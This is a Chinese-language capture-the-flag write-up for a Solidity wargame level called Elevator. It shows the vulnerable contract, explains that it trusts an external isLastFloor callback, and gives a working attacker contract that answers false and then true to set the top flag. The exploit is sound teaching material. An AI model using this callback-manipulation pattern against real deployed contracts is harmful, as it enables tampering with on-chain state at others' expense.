# Elevator
## 題目
<img width="481" alt="截圖 2024-09-09 下午11 24 43" src="https://github.com/user-attachments/assets/c4d62247-c418-4072-a9e3-f7461d4d4609">

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);  // 在設置樓層後再次檢查是否為頂樓
        }
    }
}
```
### 觀察
1. `Elevator` 合約依賴外部的 `Building` 合約來決定當前的樓層是否為最後一層（頂樓），通過 `isLastFloor` 函數來判斷。
2. 在 `goTo` 函數中，`Elevator` 會根據 `isLastFloor` 函數的回傳值來設置樓層和頂樓狀態。如果我們可以操控 `isLastFloor` 的回傳值，我們可以欺騙合約，讓它認為我們已經到達了頂樓。

### 攻擊
我們可以創建一個合約，然後這個合約會：
1. 實現 `Building` 接口中的 `isLastFloor` 函數。
2. 在第一次呼叫 `isLastFloor` 時回傳 `false`，允許 `Elevator` 更新樓層；第二次呼叫時則回傳 `true`，讓合約設置 `top` 為 `true`。

## `Hack` 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
}

contract Hack {
    IElevator private immutable target;  // 目標 Elevator 合約的引用
    uint256 private count;  // 計數器，用來操控 isLastFloor 的回傳值

    constructor(address _target) {
        target = IElevator(_target);
    }

    // 攻擊函數
    function pwn() external {
        target.goTo(1);  // 呼叫目標合約，將電梯移動到第一層
        require(target.top(), "not top");  // 確認是否已經到達頂樓
    }

    // 欺騙 Elevator 合約的邏輯
    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;  // 第一次回傳 false，第二次回傳 true
    }
}
```

### 解說：
1. **攻擊設置**：`Hack` 合約部署時，傳入目標 `Elevator` 合約的地址。
2. **觸發攻擊**：呼叫 `pwn()` 函數，這個函數會觸發目標合約的 `goTo()` 函數，將樓層設置為 1。
3. **欺騙 `Elevator`**：當 `goTo()` 呼叫 `isLastFloor()` 時，第一次回傳 `false` 讓樓層更新，第二次回傳 `true` 來設置 `top` 狀態為 `true`。
4. **驗證成功**：`pwn()` 函數中的 `require()` 驗證目標合約的 `top` 狀態是否為 `true`，確認攻擊成功。

> `goTo()` 函數中會呼叫兩次 `isLastFloor()`。我們的策略是讓第一次呼叫回傳 `false` 來更新樓層，然後讓第二次呼叫回傳 `true` 來設置 `top` 為 `true`，從而達到欺騙合約的目的。
